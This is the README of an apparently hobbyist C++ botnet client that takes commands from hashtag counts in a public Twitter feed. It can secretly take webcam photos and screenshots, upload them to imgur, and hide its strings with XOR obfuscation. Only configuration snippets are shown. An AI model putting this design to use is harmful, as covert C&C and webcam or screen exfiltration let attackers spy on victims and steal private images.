# Ted Cruz Botnet
Let Ted Cruz control your computer with his twitter feed.

Proof of concept botnet client being controlled by twitter without using twitter api.
The number of hashtags in each tweet will execute different commands.

By default the bot uses Ted Cruz's twitterfeed as a C&C but this could be easily changed to any public twitter.

```cpp
...
  const std::string target = "https://twitter.com/anypublictwitter";
...
```

The concept is to set up a free encrypted C&C going somewhere nondescript and to leak data from infected nodes.

To enable information leaking to imgur paste your accesstoken into the credentials.
```cpp
...
  const std::string accesstoken = "**Your Access Token**";
...
```
This token will be encrypted using XOR into the binary with a randomized key which will be generated at compile time with help of the obfuscator. This is mainly to remove easy snooping using strings. 

Since the decryption key is inside the binary it is feasible to extract the key and steal the access token.

## Command Structure

The commands that the bot runs is dependant on how many proper hashtag links are used in a given tweet

| Hashtags      | Command       | Leak to Imgur |
| ------------- |---------------|---|
| 1 | Take picture with webcam   |Yes|
| 2 | Take screenshot of machine |Yes|
| 3 | Rick'Roll User             |No|
| 4 | Eject Diskdrive            |No|

## Obfuscator

The obfuscator works as a preprocessor of strings in the files **strings.h** & **credentials**

First it generates a XOR key of given size

Second it extracts names and text from the given strings.

Third it encrypts the contents of these strings using the xor key and pastes the result as int arrays into a header/body combination inside the namespace **locker**.

This obfuscates the strings in the program to make it harder to reverse engineer somewhat sensetive information whilst still letting the programmer easily use said string. But it's far from being secure.
```cpp
...
  //Example of decrypting accesstoken
  std::string accesstoken = decrypt(locker::accesstoken,locker::key);
...
```
